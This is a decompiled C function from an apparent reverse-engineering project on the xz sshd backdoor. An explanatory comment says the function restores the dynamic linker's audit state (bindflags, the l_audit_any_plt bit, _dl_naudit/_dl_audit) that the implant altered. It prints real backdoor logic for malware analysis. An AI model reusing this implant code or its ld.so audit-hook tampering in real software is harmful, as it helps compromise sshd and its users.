// /home/kali/xzre-ghidra/xzregh/102770_init_ldso_ctx.c
// Function: init_ldso_ctx @ 0x102770
// Calling convention: __stdcall
// Prototype: void __stdcall init_ldso_ctx(ldso_ctx_t * ldso_ctx)


/*
 * AutoDoc: Restores every ld.so flag the implant may have touched: it writes the saved auditstate
 * bindflags back to libcrypto/sshd, unsets the copied `l_name` byte, clears the
 * `l_audit_any_plt` bit with the mask recovered earlier, and zeros `_dl_naudit`/`_dl_audit` so
 * the dynamic linker no longer believes an audit module is registered. Stage two calls it on
 * failure paths so sshd resumes with the original ld.so state.
 */

#include "xzre_types.h"

void init_ldso_ctx(ldso_ctx_t *ldso_ctx)

{
  u32 *puVar1;
  byte *pbVar2;
  byte *audit_flag_byte;
  u32 *libcrypto_bindflags_ptr;
  
  if (ldso_ctx != (ldso_ctx_t *)0x0) {
    puVar1 = ldso_ctx->libcrypto_auditstate_bindflags_ptr;
    if (puVar1 != (u32 *)0x0) {
      *puVar1 = ldso_ctx->libcrypto_auditstate_bindflags_old_value;
      if (ldso_ctx->libcrypto_l_name != (char **)0x0) {
        *ldso_ctx->libcrypto_l_name = (char *)puVar1;
      }
    }
    if (ldso_ctx->sshd_auditstate_bindflags_ptr != (u32 *)0x0) {
      *ldso_ctx->sshd_auditstate_bindflags_ptr = ldso_ctx->sshd_auditstate_bindflags_old_value;
    }
    pbVar2 = (byte *)ldso_ctx->sshd_link_map_l_audit_any_plt_addr;
    if (pbVar2 != (byte *)0x0) {
      *pbVar2 = *pbVar2 & ~ldso_ctx->link_map_l_audit_any_plt_bitmask;
    }
    if (ldso_ctx->_dl_naudit_ptr != (uint *)0x0) {
      *ldso_ctx->_dl_naudit_ptr = 0;
    }
    if (ldso_ctx->_dl_audit_ptr != (audit_ifaces **)0x0) {
      *ldso_ctx->_dl_audit_ptr = (audit_ifaces *)0x0;
    }
  }
  return;
}

